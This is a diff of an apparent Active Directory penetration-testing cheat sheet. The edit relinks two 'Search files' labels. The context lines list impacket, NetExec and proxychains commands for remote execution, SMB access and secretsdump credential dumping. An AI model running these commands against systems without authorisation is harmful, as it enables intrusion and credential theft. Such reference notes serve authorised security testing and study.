@@ -31,7 +31,7 @@ tags:
     - `nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>` [↗](https://github.com/Pennyw0rth/NetExec)
 - RDP ➡️ [[Low Access (Privilege Escalation)|Low access]] / [[Admin Access|Admin]]
     - `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>` [↗](https://linux.die.net/man/1/xfreerdp)
-- SMB ➡️ **Search files**
+- SMB ➡️ [[Lateral Movement|Search files]]
     - `smbclient.py <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py)
     - `smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>` [↗](https://github.com/p0dalirius/smbclient-ng)
 - MSSQL ➡️ [[Lateral Movement|MSSQL]]
@@ -77,7 +77,7 @@ tags:
 - `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids` [↗](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
 - `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) ➡️ [[Lateral Movement|MSSQL]]
 - `proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) ➡️ [[ACLs & ACEs Permissions|DCSYNC]]
-- `proxychains smbclient.py -no-pass <user>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) ➡️ **Search files**
+- `proxychains smbclient.py -no-pass <user>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) ➡️ [[Lateral Movement|Search files]]
 - `proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"` [↗](https://github.com/fortra/impacket/blob/master/examples/atexec.py) ➡️ [[Admin Access|Authority/System]]
 - `proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) ➡️ [[Admin Access|Authority/System]]
 
